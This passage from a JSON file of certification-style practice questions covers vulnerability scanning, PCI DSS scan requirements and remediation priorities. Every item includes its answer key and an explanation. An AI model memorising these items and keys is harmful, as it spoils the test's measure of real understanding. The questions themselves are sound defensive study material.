server logs would contain records of the queries made against the database. IDS logs may contain logs of SQL injection alerts. NetFlow logs would not contain useful information because they record only traffic flows, not the details of the communications.","l":"c7-web-ot","l2":"c3-tools","k":"web server log analysis"},{"id":"d2-123","set":"d2","ch":2,"d":2,"q":"Krista is reviewing a vulnerability scan report and comes across the vulnerability shown here. She comes from a Linux background and is not as familiar with Windows administration. She is not familiar with the <code>runas</code> command mentioned in this vulnerability. What is the closest Linux equivalent command?<figure><img alt=\"Screenshot details Microsoft Windows RunAs Zero Day vulnerability C V E 2009-0320 with C V S S base score 4 and threat.\" loading=\"lazy\" src=\"img/pt/c02un042.png\"/></figure>","o":["<code>sudo</code>","<code>grep</code>","<code>su</code>","<code>ps</code>"],"a":0,"e":"The <code>runas</code> command allows an administrator to execute a command using the privileges of another user. Linux offers the same functionality with the <code>sudo</code> command. The Linux <code>su</code> command is similar but allows an administrator to switch user identities, rather than simply execute a command using another user’s identity. The <code>ps</code> command in Linux lists active processes, whereas the <code>grep</code> command is used to search for text matching a pattern.","l":"c2-os","l2":"c7-server-network","k":"Windows runas command execution"},{"id":"d2-124","set":"d2","ch":7,"d":2,"q":"After scanning a web application for possible vulnerabilities, Barry received the result shown here. Which one of the following best describes the threat posed by this vulnerability?<figure><img alt=\"Screenshot details vulnerability report for web server plain text form based authentication with severity 3 and 142 detections.\" loading=\"lazy\" src=\"img/pt/c02un043.png\"/></figure>","o":["An attacker can eavesdrop on authentication exchanges.","An attacker can cause a denial-of-service attack on the web application.","An attacker can disrupt the encryption mechanism used by this server.","An attacker can edit the application code running on this server."],"a":0,"e":"Plaintext authentication sends credentials “in the clear,” meaning that they are transmitted in unencrypted form and are vulnerable to eavesdropping by an attacker with access to a network segment between the client and server.","l":"c7-server-network","l2":"c2-crypto","k":"cleartext authentication risks"},{"id":"d2-125","set":"d2","ch":5,"d":2,"q":"Javier ran a vulnerability scan of a network device used by his organization and discovered the vulnerability shown here. What type of attack would this vulnerability enable?<figure><img alt=\"Screenshot details vulnerability report for C V E 2002-0510 with C V S S scores, and 613 detections of U D P constant I P field behavior.\" loading=\"lazy\" src=\"img/pt/c02un044.png\"/></figure>","o":["Denial of service","Information theft","Information alteration","Reconnaissance"],"a":3,"e":"Fingerprinting vulnerabilities disclose information about a system and are used in reconnaissance attacks. This vulnerability would allow an attacker to discover the operating system and version running on the target server.","l":"c5-portscan","l2":"c5-recon","k":"operating system fingerprinting reconnaissance"},{"id":"d2-126","set":"d2","ch":7,"d":2,"q":"Akari scans a Windows server in her organization and finds that it has multiple critical vulnerabilities, detailed in the report shown here. What action can Akari take that will have the most significant impact on these issues without creating a long-term outage?<figure><img alt=\"Screenshot details 27 security vulnerabilities listing Microsoft updates, C V S S scores, and status as New and Active.\" loading=\"lazy\" src=\"img/pt/c02un045.png\"/></figure>","o":["Configure the host firewall to block inbound connections.","Apply security patches.","Disable the guest account on the server.","Configure the server to use only secure ciphers."],"a":1,"e":"The majority of the most serious issues in this scan report relate to missing security updates to Windows and applications installed on the server. Akari should schedule a short outage to apply these updates. Blocking inbound connections at the host firewall would prevent the exploitation of these vulnerabilities, but it would also prevent users from accessing the server. Disabling the guest account and configuring the use of secure ciphers would correct several vulnerabilities, but they are not as severe as the vulnerabilities related to patches.","l":"c7-server-network","l2":"c6-remediation","k":"Windows security patch remediation"},{"id":"d2-127","set":"d2","ch":7,"d":2,"q":"During a recent vulnerability scan of workstations on her network, Andrea discovered the vulnerability shown here. Which one of the following actions is <i>least</i> likely to remediate this vulnerability?<figure><img alt=\"Screenshot lists Sun Java report 4 for C V E 2007-0243 details threat, impact, and solution for G I F images buffer overflow vulnerability.\" loading=\"lazy\" src=\"img/pt/c02un046.png\"/></figure>","o":["Remove JRE from workstations.","Upgrade JRE to the most recent version.","Block inbound connections on port 80 using the host firewall.","Use a web content filtering system to scan for malicious traffic."],"a":2,"e":"This vulnerability is exploited by the user running a Java applet and does not require any inbound connections to the victim system, so a host firewall would not be an effective control. The best options to correct this vulnerability are either removing the JRE if it is no longer necessary or upgrading it to a recent, secure version. A web content filtering solution, though not the ideal solution, may be able to block malicious GIF files from exploiting this vulnerability.","l":"c7-server-network","l2":"c8-controls","k":"Java applet outbound risk"},{"id":"d2-128","set":"d2","ch":5,"d":2,"q":"Doug is preparing an RFP for a vulnerability scanner for his organization. He needs to know the number of systems on his network to help determine the scanner requirements. Which one of the following would <i>not</i> be an easy way to obtain this information?","o":["ARP tables","Asset management tool","Discovery scan","Results of scans recently run by a consultant"],"a":0,"e":"Although ARP tables may provide the necessary information, this is a difficult way to enumerate hosts and is prone to error. Doug would have much greater success if he consulted the organization’s asset management tool, ran a discovery scan, or looked at the results of other recent scans.","l":"c5-recon","l2":"c5-portscan","k":"ARP table host enumeration"},{"id":"d2-129","set":"d2","ch":6,"d":2,"q":"Mary runs a vulnerability scan of her entire organization and shares the report with another analyst on her team. An excerpt from that report appears here. Her colleague points out that the report contains only vulnerabilities with severities of 3, 4, or 5. What is the most likely cause of this result?<figure><img alt=\"Screenshot details 5 lists of security vulnerabilities for systems, Ubuntu, and Windows, including S S L and Sweet 32 across many ports.\" loading=\"lazy\" src=\"img/pt/c02un047.png\"/></figure>","o":["The scan sensitivity is set to exclude low-importance vulnerabilities.","Mary did not configure the scan properly.","Systems in the datacenter do not contain any level 1 or 2 vulnerabilities.","The scan sensitivity is set to exclude high-impact vulnerabilities."],"a":0,"e":"The most likely reason for this result is that the scan sensitivity is set to exclude low-impact vulnerabilities rated as 1 or 2. There is no reason to believe that Mary configured the scan improperly because this is a common practice to limit information overload and is likely intentional. It is extremely unlikely that systems in the datacenter contain no low-impact vulnerabilities when they have high-impact vulnerabilities. If Mary excluded high-impact vulnerabilities, the report would not contain any vulnerabilities rated 4 or 5.","l":"c6-config","l2":"c7-validate","k":"vulnerability scan sensitivity settings"},{"id":"d2-130","set":"d2","ch":7,"d":2,"q":"Mikhail is reviewing the vulnerability shown here, which was detected on several servers in his environment. What action should Mikhail take?<figure><img alt=\"Screenshot details T C P I P Timestamps Supported report features host uptime can be computed, with I D 25220 and version 1.19.\" loading=\"lazy\" src=\"img/pt/c02un048.png\"/></figure>","o":["Block TCP/IP access to these servers from external sources.","Upgrade the operating system on these servers.","Encrypt all access to these servers.","No action is necessary."],"a":3,"e":"This vulnerability is presented as an Info level vulnerability and, therefore, does not represent an actual threat to the system. Mikhail can safely ignore this issue.","l":"c7-validate","l2":"","k":"informational scan finding assessment"},{"id":"d2-131","set":"d2","ch":6,"d":2,"q":"Which one of the following approaches provides the most current and accurate information about vulnerabilities present on a system because of the misconfiguration of operating system settings?\n<p><a href=\"#Que132\">Questions 132</a>–<a href=\"#Que134\">134</a> refer to the following scenario:</p>\n<p>Pete recently conducted a broad vulnerability scan of all the servers and workstations in his environment. He scanned the following three networks:</p>\n<ul class=\"square\">\n<li>Screened subnet (DMZ) network that contains servers with public exposure</li>\n<li>Workstation network that contains workstations that are allowed outbound access only</li>\n<li>Internal server network that contains servers exposed only to internal systems</li></ul>\n<p>He detected the following vulnerabilities:</p>\n<ul class=\"square\">\n<li>Vulnerability 1: A SQL injection vulnerability on a screened subnet (DMZ) server that would grant access to a database server on the internal network (severity 5/5)</li>\n<li>Vulnerability 2: A buffer overflow vulnerability on a domain controller on the internal server network (severity 3/5)</li>\n<li>Vulnerability 3: A missing security patch on several hundred Windows workstations on the workstation network (severity 2/5)</li>\n<li>Vulnerability 4: A denial-of-service vulnerability on a screened subnet (DMZ) server that would allow an attacker to disrupt a public-facing website (severity 2/5)</li>\n<li>Vulnerability 5: A denial-of-service vulnerability on an internal server that would allow an attacker to disrupt an internal website (severity 4/5)</li></ul>\n<p>Note that the severity ratings assigned to these vulnerabilities are directly from the vulnerability scanner and were not assigned by Pete.</p>","o":["On-demand vulnerability scanning","Continuous vulnerability scanning","Scheduled vulnerability scanning","Agent-based monitoring"],"a":3,"e":"Vulnerability scans can only provide a snapshot in time of a system’s security status from the perspective of the vulnerability scanner. Agent-based monitoring provides a detailed view of the system’s configuration from an internal perspective and is likely to provide more accurate results, regardless of the frequency of vulnerability scanning.","l":"c6-config","l2":"","k":"continuous agent-based monitoring"},{"id":"d2-132","set":"d2","ch":7,"d":2,"q":"Absent any other information, which one of the vulnerabilities in the report should Pete remediate first?","o":["Vulnerability 1","Vulnerability 2","Vulnerability 3","Vulnerability 4"],"a":0,"e":"The SQL injection vulnerability is clearly the highest priority for remediation. It has the highest severity (5/5) and also exists on a server that has public exposure because it resides on the screened subnet (DMZ) network.","l":"c7-validate","l2":"c7-web-ot","k":"SQL injection remediation urgency"},{"id":"d2-133","set":"d2","ch":8,"d":2,"q":"Pete is working with the desktop support manager to remediate vulnerability 3. What would be the most efficient way to correct this issue?","o":["Personally visit each workstation to remediate the vulnerability.","Remotely connect to each workstation to remediate the vulnerability.","Perform Registry updates using a remote configuration tool.","Apply the patch using a GPO."],"a":3,"e":"Pete and the desktop support team should apply the patch using a Group Policy Object (GPO) or other centralized configuration management tool. This is much more efficient than visiting each workstation individually, either in person or via remote connection. There is no indication in the scenario that a Registry update would remediate this issue.","l":"c8-controls","l2":"c1-endpoint-pentest","k":"Group Policy patch deployment"},{"id":"d2-134","set":"d2","ch":7,"d":2,"q":"Pete recently conferred with the organization’s CISO, and the team is launching an initiative designed to combat the insider threat. They are particularly concerned about the theft of information by employees seeking to exceed their authorized access. Which one of the vulnerabilities in this report is of greatest concern given this priority?","o":["Vulnerability 2","Vulnerability 3","Vulnerability 4","Vulnerability 5"],"a":0,"e":"An insider would have the network access required to connect to a system on the internal server network and exploit this buffer overflow vulnerability. Buffer overflow vulnerabilities typically allow the execution of arbitrary code, which may allow an attacker to gain control of the server and access information above their authorization level. Vulnerability 3 may also allow the theft of information, but it has a lower severity level than vulnerability 2. Vulnerabilities 4 and 5 are denial-of-service vulnerabilities that would allow the disruption of service, not the theft of information.","l":"c7-validate","l2":"c8-managing","k":"insider threat vulnerability prioritization"},{"id":"d2-135","set":"d2","ch":8,"d":2,"q":"Wanda recently discovered the vulnerability shown here on a Windows server in her organization. She is unable to apply the patch to the server for six weeks because of operational issues. What workaround would be most effective in limiting the likelihood that this vulnerability would be exploited?<figure><img alt=\"Screenshot details severity 4 Windows Graphics Component report M S 17-013 with C V S S score 9 and remote code execution impact.\" loading=\"lazy\" src=\"img/pt/c02un049.png\"/></figure>","o":["Restrict interactive logins to the server.","Remove Microsoft Office from the server.","Remove all web browsers from the server.","Apply the security patch."],"a":0,"e":"Wanda should restrict interactive logins to the server. The vulnerability report states that “The most severe of these vulnerabilities could allow remote code execution if a user either visits a specially crafted website or opens a specially crafted document.” If Wanda restricts interactive login, it greatly reduces the likelihood of this type of activity. Removing web browsers or Microsoft Office might lower some of the risk, but it would not be as effective as completely restricting logins. Applying the security patch is not an option because of the operational concerns cited in the question.","l":"c8-controls","l2":"c2-os","k":"interactive login restrictions"},{"id":"d2-136","set":"d2","ch":6,"d":2,"q":"Garrett is configuring vulnerability scanning for a new web server that his organization is deploying on its screened subnet (DMZ) network. The server hosts the company’s public website. What type of scanning should Garrett configure for best results?","o":["Garrett should not perform scanning of screened subnet (DMZ) systems.","Garrett should perform external scanning only.","Garrett should perform internal scanning only.","Garrett should perform both internal and external scanning."],"a":3,"e":"For best results, Garrett should combine both internal and external vulnerability scans. The external scan provides an “attacker’s eye view” of the web server, whereas the internal scan may uncover vulnerabilities that would only be exploitable by an insider or an attacker who has gained access to another system on the network.","l":"c6-config","l2":"","k":"comprehensive internal and external scanning"},{"id":"d2-137","set":"d2","ch":8,"d":2,"q":"Frank recently ran a vulnerability scan and identified a POS terminal that contains an unpatchable vulnerability because of running an unsupported operating system. Frank consults with his manager and is told that the POS is being used with full knowledge of management and, as a compensating control, it has been placed on an isolated network with no access to other systems. Frank’s manager tells him that the merchant bank is aware of the issue. How should Frank handle this situation?","o":["Document the vulnerability as an approved exception.","Explain to his manager that PCI DSS does not permit the use of unsupported operating systems.","Decommission the POS system immediately to avoid personal liability.","Upgrade the operating system immediately."],"a":0,"e":"The scenario describes an acceptable use of a compensating control that has been reviewed with the merchant bank. Frank should document this as an exception and move on with his scans. Other actions would go against his manager’s wishes and are not required by the situation.","l":"c8-governance","l2":"c6-remediation","k":"documented compensating control exception"},{"id":"d2-138","set":"d2","ch":6,"d":2,"q":"James is configuring vulnerability scans of a dedicated network that his organization uses for processing credit card transactions. What types of scans are least important for James to include in his scanning program?","o":["Scans from a dedicated scanner on the card processing network.","Scans from an internal scanner on his organization’s network.","Scans from an external scanner operated by an approved scanning vendor.","All three types of scans are equally important."],"a":3,"e":"All three of these scan types provide James with important information and/or are needed to meet regulatory requirements. The external scan from James’s own network provides information on services accessible outside of the payment card network. The internal scan may detect vulnerabilities accessible to an insider or someone who has breached the network perimeter. The approved scanning vendor (ASV) scans are required to meet PCI DSS obligations. Typically, ASV scans are run infrequently and do not provide the same level of detailed reporting as scans run by the organization’s own external scans, so James should include all three in his program.","l":"c6-config","l2":"","k":"multi-perspective vulnerability scanning"},{"id":"d2-139","set":"d2","ch":5,"d":2,"q":"Helen performs a vulnerability scan of one of the internal LANs within her organization and finds a report of a web application vulnerability on a device. Upon investigation, she discovers that the device in question is a printer. What is the most likely scenario in this case?","o":["The printer is running an embedded web server.","The report is a false positive result.","The printer recently changed IP addresses.","Helen inadvertently scanned the wrong network."],"a":0,"e":"Any one of the answer choices provided is a possible reason that Helen received this result. However, the most probable scenario is that the printer is actually running a web server and this is a true positive result. Printers commonly provide administrative web interfaces, and those interfaces may be the source of vulnerabilities.","l":"c5-portscan","l2":"c7-server-network","k":"printer embedded web server"},{"id":"d2-140","set":"d2","ch":5,"d":2,"q":"Julian recently detected the vulnerability shown here on several servers in his environment. Because of the critical nature of the vulnerability, he would like to block all access to the affected service until it is resolved using a firewall rule. He verifies that the following TCP ports are open on the host firewalls. Which one of the following does Julian <i>not</i> need to block to restrict access to this service?<figure><img alt=\"Screenshot details Microsoft S M B Server remote code execution vulnerability M S 17 010 with severity 5 and C V S S base score 9.\" loading=\"lazy\" src=\"img/pt/c02un050.png\"/></figure>","o":["137","139","389","445"],"a":2,"e":"Port 389 is used by the Lightweight Directory Access Protocol (LDAP) and is not part of the SMB communication. SMB may be accessed directly over TCP port 445 or indirectly by using NetBIOS over TCP/IP on TCP ports 137 and 139.","l":"c5-portscan","l2":"c2-iam","k":"LDAP directory service port"},{"id":"d2-141","set":"d2","ch":6,"d":2,"q":"Ted recently ran a vulnerability scan of his network and was overwhelmed with results. He would like to focus on the most important vulnerabilities. How should Ted reconfigure his vulnerability scanner?","o":["Increase the scan sensitivity.","Decrease the scan sensitivity.","Increase the scan frequency.","Decrease the scan frequency."],"a":1,"e":"Ted can reduce the number of results returned by the scan by decreasing the scan sensitivity. This will increase the threshold for reporting, only returning the most important results. Increasing the scan sensitivity would have the opposite effect, increasing the number of reported vulnerabilities. Changing the scan frequency would not alter the number of vulnerabilities reported.","l":"c6-config","l2":"c7-validate","k":"reducing scan sensitivity levels"},{"id":"d2-142","set":"d2","ch":8,"d":2,"q":"Sunitha discovered the vulnerability shown here in an application developed by her organization. What application security technique is most likely to resolve this issue?<figure><img alt=\"Screenshot details Sun Java RunTime G I F buffer overflow vulnerability, C V E 2007-0243, C V S S score 6 point 8, and 22 detections.\" loading=\"lazy\" src=\"img/pt/c02un051.png\"/></figure>","o":["Input validation","Network segmentation","Parameter handling","Tag removal"],"a":0,"e":"Buffer overflow vulnerabilities occur when an application attempts to put more data in a memory location than was allocated for that use, resulting in unauthorized writes to other areas of memory. Input validation verifies that user-supplied input does not exceed the maximum allowable length before storing it in memory.","l":"c8-sdlc","l2":"c7-server-network","k":"buffer overflow input validation"},{"id":"d2-143","set":"d2","ch":7,"d":2,"q":"Sherry runs a vulnerability scan and receives the high-level results shown here. Her priority is to remediate the most important vulnerabilities first. Which system should be her highest priority?<figure><img alt=\"Diagram details 4 systems A to D, with status counts for critical, high, medium, and informational categories.\" loading=\"lazy\" src=\"img/pt/c02un052.png\"/></figure>","o":["A","B","C","D"],"a":3,"e":"System D is the only system that contains a critical vulnerability, as shown in the scan results. Therefore, Sherry should begin with this system as it has the highest priority vulnerability.","l":"c7-validate","l2":"c6-remediation","k":"critical vulnerability host prioritization"},{"id":"d2-144","set":"d2","ch":6,"d":2,"q":"Victor is configuring a new vulnerability scanner. He set the scanner to run scans of his entire datacenter each evening. When he went to check the scan reports at the end of the week, he found that they were all incomplete. The scan reports noted the error “Scan terminated due to start of preempting job.” Victor has no funds remaining to invest in the vulnerability scanning system. He does want to cover the entire datacenter. What should he do to ensure that scans complete?","o":["Reduce the number of systems scanned.","Increase the number of scanners.","Upgrade the scanner hardware.","Reduce the scanning frequency."],"a":3,"e":"The problem Victor is experiencing is that the full scan does not complete in the course of a single day and is being cancelled when the next full scan tries to run. He can fix this problem by reducing the scanning frequency. For example, he could set the scan to run once a week so that it completes. Reducing the number of systems scanned would not meet his requirement to scan the entire datacenter. He cannot increase the number of scanners or upgrade the hardware because he has no funds to invest in the system.","l":"c6-requirements","l2":"c6-config","k":"scan window duration tuning"},{"id":"d2-145","set":"d2","ch":7,"d":2,"q":"Vanessa ran a vulnerability scan of a server and received the results shown here. Her boss instructed her to prioritize remediation based on criticality. Which issue should she address first?<figure><img alt=\"Screenshot details security scan results with columns for Severity, Plugin Name, Plugin Family, and Count for 20 Apache and S S H findings.\" loading=\"lazy\" src=\"img/pt/c02un053.png\"/></figure>","o":["Remove the POP server.","Remove the FTP server.","Upgrade the web server.","Remove insecure cryptographic protocols."],"a":2,"e":"The only high-criticality issue on this report (and all but one of the medium-criticality issues) relates to an outdated version of the Apache web server. Vanessa should upgrade this server before taking any other remediation action.","l":"c7-server-network","l2":"c6-remediation","k":"web server software upgrade"},{"id":"d2-146","set":"d2","ch":7,"d":2,"q":"Terry is reviewing a vulnerability scan of a Windows server and came across the vulnerability shown here. What is the risk presented by this vulnerability?<figure><img alt=\"Screenshot details a vulnerability report for Detected Compatibility 8.3 Filename Feature on Windows, with threat and solution details.\" loading=\"lazy\" src=\"img/pt/c02un054.png\"/></figure>","o":["An attacker may be able to execute a buffer overflow and execute arbitrary code on the server.","An attacker may be able to conduct a denial-of-service attack against this server.","An attacker may be able to determine the operating system version on this server.","There is no direct vulnerability, but this information points to other possible vulnerabilities on the server."],"a":3,"e":"This scan result does not directly indicate a vulnerability in the server itself. However, it does indicate that the server is configured for compatibility with 16-bit applications, and those applications may have serious vulnerabilities. It is an informational result that does not directly require action on Terry’s behalf.","l":"c7-validate","l2":"c2-os","k":"Windows NetBIOS configuration review"},{"id":"d2-147","set":"d2","ch":7,"d":2,"q":"Andrea recently discovered the vulnerability shown here on the workstation belonging to a system administrator in her organization. What is the major likely threat that should concern Andrea?<figure><img alt=\"Screenshot details a PuTTY vulnerability report with April 5, 2020, detection date, 2.1 score, and threat summary.\" loading=\"lazy\" src=\"img/pt/c02un055.png\"/></figure>","o":["An attacker could exploit this vulnerability to take control of the administrator’s workstation.","An attacker could exploit this vulnerability to gain access to servers managed by the administrator.","An attacker could exploit this vulnerability to prevent the administrator from using the workstation.","An attacker could exploit this vulnerability to decrypt sensitive information stored on the administrator’s workstation."],"a":1,"e":"PuTTY is a commonly used remote login application used by administrators to connect to servers and other networked devices. If an attacker gains access to the SSH private keys used by PuTTY, the attacker could use those keys to gain access to the systems managed by that administrator. This vulnerability does not necessarily give the attacker any privileged access to the administrator’s workstation, and the SSH key is not normally used to encrypt stored information.","l":"c7-server-network","l2":"c1-endpoint-pentest","k":"outdated PuTTY client vulnerability"},{"id":"d2-148","set":"d2","ch":6,"d":2,"q":"Avik recently conducted a PCI DSS vulnerability scan of a web server and noted a critical PHP vulnerability that required an upgrade to correct. She applied the update. How soon must Avik repeat the scan?","o":["Within 30 days","At the next scheduled quarterly scan","At the next scheduled annual scan","Immediately"],"a":3,"e":"Avik is required to rerun the vulnerability scan until she receives a clean result that may be submitted for PCI DSS compliance purposes.","l":"c6-requirements","l2":"c6-remediation","k":"PCI DSS clean scan requirement"},{"id":"d2-149","set":"d2","ch":6,"d":2,"q":"Chandra’s organization recently upgraded the firewall protecting the network where they process credit card information. This network is subject to the provisions of PCI DSS. When is Chandra required to schedule the next vulnerability scan of this network?","o":["Immediately","Within one month","Before the start of next month","Before the end of the quarter following the upgrade"],"a":0,"e":"PCI DSS requires that networks be scanned at least quarterly or after any “significant change in the network.” A firewall upgrade definitely qualifies as a significant network change, and Chandra should schedule a vulnerability scan immediately to maintain PCI DSS compliance.","l":"c6-requirements","l2":"","k":"PCI DSS significant change scanning"},{"id":"d2-150","set":"d2","ch":7,"d":2,"q":"Fahad is concerned about the security of an industrial control system (ICS) that his organization uses to monitor and manage systems in their factories. He would like to reduce the risk of an attacker penetrating this system. Which one of the following security controls would best mitigate the vulnerabilities in this type of system?","o":["Network segmentation","Input validation","Memory protection","Redundancy"],"a":0,"e":"Network segmentation is one of the strongest controls that may be used to protect ICS and supervisory control and data acquisition (SCADA) systems by isolating them from other systems on the network. Input validation and memory protection may provide some security, but the mitigating effect is not as strong as isolating these sensitive systems from other devices and preventing an attacker from connecting to them in the first place. Redundancy may increase uptime from accidental failures but would not protect the systems from attack.","l":"c7-web-ot","l2":"c1-network","k":"ICS network segmentation"},{"id":"d2-151","set":"d2","ch":7,"d":2,"q":"Raphael discovered during a vulnerability scan that an administrative interface to one of his storage systems was inadvertently exposed to the Internet. He is reviewing firewall logs and would like to determine whether any access attempts came from external sources. Which one of the following IP addresses reflects an external source?","o":["10.15.1.100","12.8.1.100","172.16.1.100","192.168.1.100"],"a":1,"e":"Any addresses in the 10.<i>x</i>.<i>x</i>.<i>x</i>, 172.16.<i>x</i>.x to 172.31.x.x, and 192.168.<i>x</i>.<i>x</i> ranges are private IP addresses that are not routable over the Internet. Therefore, of the addresses listed, only 12.8.1.100 could originate outside the local network.","l":"c7-server-network","l2":"c1-network","k":"public IP address identification"},{"id":"d2-152","set":"d2","ch":6,"d":2,"q":"Nick is configuring vulnerability scans for his network using a third-party vulnerability scanning service. He is attempting to scan a web server that he knows exposes a Windows file share and contains several significant vulnerabilities. However, the scan results only show ports 80 and 443 as open. What is the most likely cause of these scan results?","o":["The file share is running on port 443.","A firewall configuration is preventing the scan from succeeding.","The scanner configuration is preventing the scan from succeeding.","The file share is running on port 80."],"a":1,"e":"The most likely issue here is that there is a network firewall between the server and the third-party scanning service. This firewall is blocking inbound connections to the web server and preventing the external scan from succeeding. Windows file sharing generally runs on port 445, not port 80 or 443. Those ports are commonly associated with web services. The scanner is not likely misconfigured because it is successfully detecting other ports on the server. Nick should either alter the firewall rules to allow the scan to succeed or, preferably, place a scanner on a network in closer proximity to the web server.","l":"c6-config","l2":"c1-network","k":"external scanner firewall filtering"},{"id":"d2-153","set":"d2","ch":8,"d":2,"q":"Thomas learned this morning of a critical security flaw that affects a major service used by his organization and requires immediate patching. This flaw was the subject of news reports and is being actively exploited. Thomas has a patch and informed stakeholders of the issue and received permission to apply the patch during business hours. How should he handle the change management process?","o":["Thomas should apply the patch and then follow up with an emergency change request after work is complete.","Thomas should initiate a standard change request but apply the patch before waiting for approval.","Thomas should work through the standard change approval process and wait until it is complete to apply the patch.","Thomas should file an emergency change request and wait until it is approved to apply the patch."],"a":0,"e":"Change management processes should always include an emergency change procedure. This procedure should allow applying emergency security patches without working through the standard change process. Thomas has already secured stakeholder approval on an informal basis, so he should proceed with the patch and then file a change request after the work is complete. Taking the time to file the change request before completing the work would expose the organization to a critical security flaw during the time required to complete the paperwork.","l":"c8-controls","l2":"c6-remediation","k":"emergency change management process"},{"id":"d2-154","set":"d2","ch":7,"d":2,"q":"After running a vulnerability scan of systems in his organization’s development shop, Mike discovers the issue shown here on several systems. What is the best solution to this vulnerability?<figure><img alt=\"Screenshot details a security report for obsolete Microsoft dot Net software with a C V S S base score of 9.3 and 15 detections.\" loading=\"lazy\" src=\"img/pt/c02un056.png\"/></figure>","o":["Apply the required security patches to this framework.","Remove this framework from the affected systems.","Upgrade the operating system of the affected systems.","No action is necessary."],"a":1,"e":"The vulnerability description indicates that this software has reached its end-of-life (EOL) and, therefore, is no longer supported by Microsoft. Mike’s best solution is to remove this version of the framework from the affected systems. No patches will be available for future vulnerabilities. There is no indication from this result that the systems require operating system upgrades. Mike should definitely take action because of the critical severity (5 on a 5-point scale) of this vulnerability.","l":"c7-server-network","l2":"c8-controls","k":"end-of-life software decommissioning"},{"id":"d2-155","set":"d2","ch":6,"d":2,"q":"Tran is preparing to conduct vulnerability scans against a set of workstations in his organization. He is particularly concerned about system configuration settings. Which one of the following scan types will give him the best results?","o":["Unauthenticated scan","Credentialed scan","External scan","Internal scan"],"a":1,"e":"Credentialed scans are able to log on to the target system and directly retrieve configuration information, providing the most accurate results of the scans listed. Unauthenticated scans must rely on external indications of configuration settings, which are not as accurate. The network location of the scanner (external versus internal) will not have a direct impact on the scanner’s ability to read configuration information.","l":"c6-config","l2":"","k":"credentialed vulnerability scanning benefits"},{"id":"d2-156","set":"d2","ch":6,"d":2,"q":"Brian is configuring a vulnerability scan of all servers in his organization’s datacenter. He is configuring the scan to detect only the highest-severity vulnerabilities. He would like to empower system administrators to correct issues on their servers but also have some insight into the status of those remediations. Which approach would best serve Brian’s interests?","o":["Give the administrators access to view the scans in the vulnerability scanning system.","Send email alerts to administrators when the scans detect a new vulnerability on their servers.","Configure the vulnerability scanner to open a trouble ticket when it detects a new vulnerability on a server.","Configure the scanner to send reports to Brian who can notify administrators and track them in a spreadsheet."],"a":2,"e":"The best path for Brian to follow would be to leverage the organization’s existing trouble ticket system. Administrators likely already use this system on a regular basis, and it can handle reporting and escalation of issues. Brian might want to give administrators access to the scanner and/or have emailed reports sent automatically as well, but those will not provide the tracking that he desires.","l":"c6-remediation","l2":"c1-efficiency","k":"ticketing system remediation workflow"},{"id":"d2-157","set":"d2","ch":6,"d":2,"q":"Xiu Ying is configuring a new vulnerability scanner for use in her organization’s datacenter. Which one of the following values is considered a best practice for the scanner’s update frequency?","o":["Daily","Weekly","Monthly","Quarterly"],"a":0,"e":"Vulnerability scanners should be updated as often as possible to allow the scanner to retrieve new vulnerability signatures as soon as they are released. Xiu Ying should choose daily updates.","l":"c6-config","l2":"","k":"daily scanner feed updates"},{"id":"d2-158","set":"d2","ch":7,"d":2,"q":"Ben’s manager recently assigned him to begin the remediation work on the most vulnerable server in his organization. A portion of the scan report appears here. What remediation action should Ben take first?<figure><img alt=\"Screenshot lists 50 vulnerabilities for Mozilla Firefox, Adobe Flash Player, and Microsoft Windows with severity rating and reference codes.\" loading=\"lazy\" src=\"img/pt/c02un057.png\"/></figure>","o":["Install patches for Adobe Flash.","Install patches for Firefox.","Run Windows Update.","Remove obsolete software."],"a":2,"e":"Ben is facing a difficult challenge and should likely perform all of the actions described in this question. However, the best starting point would be to run Windows Update to install operating system patches. Many of the critical vulnerabilities relate to missing Windows patches. The other actions may also resolve critical issues, but they all involve software that a user must run on the server before they can be exploited. This makes them slightly lower priorities than the Windows flaws that may be remotely exploitable with no user action.","l":"c7-server-network","l2":"c8-controls","k":"Windows Update patch remediation"},{"id":"d2-159","set":"d2","ch":7,"d":2,"q":"Zhang Wei completed a vulnerability scan of his organization’s virtualization platform from an external host and discovered the vulnerability shown here. How should he react?<figure><img alt=\"Screenshot details a security report for unencrypted credentials detected 21 times with a C V S S base score of 4.3.\" loading=\"lazy\" src=\"img/pt/c02un058.png\"/></figure>","o":["This is a critical issue that requires immediate adjustment of firewall rules.","This issue has a very low severity and does not require remediation.","This issue should be corrected as time permits.","This is a critical issue, and Zhang Wei should shut down the platform until it is corrected."],"a":0,"e":"Although the vulnerability scan report does indicate that this is a low-severity vulnerability, Zhang Wei must take this information in context. The management interface of a virtualization platform should never be exposed to external hosts, and it also should not use unencrypted credentials. In that context, this is a critical vulnerability that could allow an attacker to take control of a large portion of the computing environment. Zhang Wei should work with security and network engineers to block this activity at the firewall as soon as possible. Shutting down the virtualization platform is not a good alternative because it would be extremely disruptive, and the firewall adjustment is equally effective from a security point of view.","l":"c7-validate","l2":"c2-infra","k":"virtualization platform critical vulnerabilities"},{"id":"d2-160","set":"d2","ch":7,"d":2,"q":"Elliott runs a vulnerability scan of one of the servers belonging to his organization and finds the results shown here. Which one of these statements is <i>not</i> correct?<figure><img alt=\"Screenshot details 29 vulnerabilities including security updates for Red Hat and Oracle, severity levels, and status indicators.\" loading=\"lazy\" src=\"img/pt/c02un059.png\"/></figure>","o":["This server requires one or more Linux patches.","This server requires one or more Oracle database patches.","This server requires one or more Firefox patches.","This server requires one or more MySQL patches."],"a":1,"e":"The server described in this report requires multiple Red Hat Linux and Firefox patches to correct serious security issues. One of those Red Hat updates also affects the MySQL database service. Although there are Oracle patches listed on this report, they relate to Oracle Java, not an Oracle database.","l":"c7-server-network","l2":"c6-remediation","k":"Linux and Firefox patch requirements"},{"id":"d2-161","set":"d2","ch":8,"d":2,"q":"Tom runs a vulnerability scan of the file server shown here. He receives the vulnerability report shown next.<figure><img alt=\"Network diagram shows a firewall connects internet to an internal network with a workstation, server, and a screened subnet with 2 servers.\" loading=\"lazy\" src=\"img/pt/c02un060b.png\"/></figure>\n<p>Assuming that the firewall is configured properly, what action should Tom take immediately?</p>\n<figure><img alt=\"Screenshot details 5 security vulnerabilities including Windows Remote Desktop Protocol and account issues with severity levels from 1 to 3.\" loading=\"lazy\" src=\"img/pt/c02un060a.png\"/></figure>","o":["Block RDP access to this server from all hosts.","Review and secure server accounts.","Upgrade encryption on the server.","No action is required."],"a":1,"e":"The scan report shows two issues related to server accounts: a weak password policy for the Administrator account and an active Guest account. Tom should remediate these issues to protect against the insider threat. The server also has an issue with weak encryption, but this is a lower priority given that the machine is located on an internal 